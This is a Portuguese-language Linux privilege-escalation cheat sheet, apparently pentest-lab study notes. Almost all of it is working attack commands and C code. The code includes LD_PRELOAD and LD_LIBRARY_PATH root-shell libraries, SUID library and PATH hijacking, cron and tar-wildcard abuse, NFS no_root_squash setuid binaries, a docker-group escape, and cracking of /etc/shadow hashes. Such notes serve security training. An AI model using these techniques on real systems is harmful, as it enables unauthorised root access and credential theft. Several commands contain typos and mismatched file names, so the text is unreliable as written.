## ESCALONAMENTO DE PRIVILEGIOS NO LINUX  
[![Banner](banner.png)]()   

> Confira diversas tecnicas para escalonamento de privilegios no linux.  

#### Links:  
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md  
> https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
> https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist  
> https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html  
> https://github.com/Gr1mmie/Linux-Privilege-Escalation-Resources  


###### Machine Enumeration:  
```
$ hostname
$ cat /proc/version
$ lspcu
$ uname -a
$ ps aux
```

###### User Enumeration:  
```
$ whoami
$ id
$ sudo -l
$ cat /etc/passwd
$ history
```

###### Network Enumeration:  
```
$ ip addr
$ ip route
$ route
$ ip neigh
$ netstat -nlpt
```

###### Password Hunting:  
```
$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
$ locate password | less
$ find / -name id_rsa 2> /dev/null
```

#### Ferramentas automatizadas:  

###### Links:  
> https://github.com/mzet-/linux-exploit-suggester  
> https://github.com/rebootuser/LinEnum  
> https://github.com/sleventyeleven/linuxprivchecker  
> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  

#### Hijacking python:  
> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/  

#### Kernel exploit excalation  
###### Links:  
> https://github.com/lucyoa/kernel-exploits  

#### Exploit files and passwords  
###### Unshadow:  
```
$ unshadow passwd shadow > unshadowed
$ hashcat -m 1800 unshadowed rockyou.txt -O 
```
###### Ssh keys:  
```
$ find / -name authorized_keys 2> /dev/null
$ find / -name id_rsa 2> /dev/null
$ chmod 600 id_rsa
$ ssh -i id_rsa root@$IP
```

#### Sudo shell escape
```
$ sudo -l
```
> Go to google and search for: GTFOBINS
###### https://gtfobins.github.io/   


#### LD_PRELOAD (carrega um objeto compartilhando antes de qualquer outro programa executado)  
> [http://manpages.ubuntu.com/manpages/trusty/man5/sudoers.5.html]  

###### Criando a vulnerabilidade:  
```
$ visudo
```

```
Defaults        env_keep += "LD_PRELOAD"
```

###### Identificando a vulnerabilidade:  
```
$ sudo -l
```

```
env_keep+=LD_PRELOAD
```

###### Criando malware para exploracao: 
```
$ pico shell.c
```

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

###### Compilando:  
```
$ gcc  -fPIC -shared -o shell.so shell.c -nostartfiles
```

##### Ativando:  
```
$ sudo LD_PRELOAD=/home/user/shell.so apache2
```

###### LD_LIBRARY_PATH (Fornece uma lista de diretorios aonde as bibliotecas compartilhadas sao pesquisadas primeiro.)  
```
$ sudo -l
$ ldd /usr/sbin/apache2
```

```
libcrypt.so.1 => /lib/libcrypt.so.1 (0x000f744453c000)
```

```
$ vi /tmp/shell.c
```

```
#include <stdio.h>
#include <stdlib.h>

static void hack() __attribute__((constructor));

void hack(){
    unsetenv("LD_LIBRARY_PATH");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

```
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/shell.c
$ sudo LD_LIBRARY_PATH=/tmp apache2
```

#### SUID  
###### Encontrando arquivos suid:
```
$ find / -perm -u=s -type f 2>/dev/null
$ find / -type f -perm 04000 -ls 2>/dev/null
```

###### Suid em libliotecas:  
```
$ find / -type f -perm 04000 -ls 2>/dev/null
```

```
/usr/local/bin/suid-so
```

```
$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file|"
$ mkdir /home/user/.config
$ pico libcalc.c
```

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```
$ gcc -shared -fPIC -o /home/user/.config/libcalc.so  /home/user/libcalc.c
$ /usr/local/bin/suid-so
```

###### Suid em variaveis de ambiente: (suid-env)  
```
$ find / -type f -perm 04000 -ls 2>/dev/null
```

```
/usr/local/bin/suid-env
```

```
$ env
$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /tmp/service.c'
$ gcc /tmp/system.c -o /tmp/service
$ export PATH=/tmp:$PATH
$ /usr/local/bin/suid-env
```

###### OU (PARA BASH < 4.2)  

```
$ find / -type f -perm 04000 -ls 2>/dev/null
```

```
/usr/local/bin/suid-env2
```

```
$ strings /usr/local/bin/suid-env2
```

```
/usr/sbin/service apache2 start
```

```
$ function /usr/sbin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
$ export -f /usr/sbin/service
$ /usr/local/bin/suid-env2
```

###### OU (PARA BASH < 4.4)  
```
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/sh /tmp/miow && chmd +xs /tmp/miow)' /usr/local/bin/suid-env2
$ /tmp/miow -p
```

#### Groups  
```
$ find / -group GROUP_NAME -type f 2>/dev/null
```

#### Capabilities  
###### Links:  
> https://mn3m.info/posts/suid-vs-capabilities/  
> https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099  
> https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/  
```
$ getcap -r / 2>/dev/null
```

```
/usr/bin/python2.6 = cap_setuid+ep
```

```
$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Cron jobs  

###### Arquivo inexistente:  
```
$ cat /etc/crontab
```

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root overwrite.sh     #Este arquivo nao existe.
```

###### Criando o arquivo:  
```
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```

###### Executando:  
```
$ /tmp/bash -p
```

###### Check point com caracteres curingas  
```
$ cat /etc/crontab
```

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/local/bin/compress.sh
```

```
$ cat /usr/local/bin/compress.sh
```

```
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

###### Criando o arquivo:  
```
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=sh\runme.sh
```

###### Executando:  
```
$ /tmp/bash -p
```

###### Arquivo com permissao de gravacao:   
```
$ cat /etc/crontab
```

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/local/bin/compress.sh
```

```
$ ls -la /usr/local/bin/compress.sh
```

```
rwx--rw- 1 root staff 14 mar 15 2020 /usr/local/bin/compress.sh
```

###### Criando o arquivo:  
```
$ pico /usr/local/bin/compress.sh
```

```
#!/bin/sh
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```


###### Executando:  
```
$ /tmp/bash -p
```

#### Mount  
> [no_root_squash]  
```
$ cat /etc/exports
```

```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

```
$ showmount -e $IP-VICTM
```

```
/tmp * 
```

```
$ mkdir /tmp/mountme
$ mount -o rw,vers=2 $IP-VICTM:/tmp /tmp/mountme
$ echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/x.c
$ gcc /tmp/mountme/x.c -o /tmp/mountme/x
$ chmod +s /tmp/mountme/x
```
```
$ cd /tmp
$ ./x

```

#### DOCKER (priv scalation)  
```
$ id
```

```
116(docker)
```

###### Go to https://gtfobins.github.io/  
```
$ docker imagens
$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
